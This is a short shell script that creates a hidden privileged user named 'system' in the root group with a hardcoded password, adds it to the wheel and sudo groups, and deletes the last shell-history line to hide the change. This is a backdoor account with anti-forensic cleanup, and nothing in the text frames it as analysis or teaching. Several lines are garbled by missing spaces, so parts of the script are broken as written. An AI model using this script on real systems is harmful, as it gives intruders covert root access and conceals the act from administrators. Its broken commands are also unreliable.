#!/bin/sh
useradd system -groot -M
echo'0c117864a02827ba'| passwd --stdin system
usermod -a -G wheelsystem
usermod -a -G sudosystem
sed -i '$d'~/.bash_history
